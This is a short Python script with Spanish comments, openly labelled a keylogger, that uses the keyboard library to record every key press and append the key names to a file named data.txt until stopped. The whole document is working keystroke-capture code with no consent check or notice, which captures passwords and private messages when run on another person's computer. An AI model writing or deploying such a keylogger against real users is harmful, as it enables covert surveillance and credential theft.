# pip install keyboard
# El keylogger es un detector de pulsacion de tu teclado

import keyboard


def pressedKeys(key):  # Aqui van todas las teclas que estemos pulsando

    with open('data.txt', 'a') as file:

        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)


keyboard.on_press(pressedKeys)
keyboard.wait()
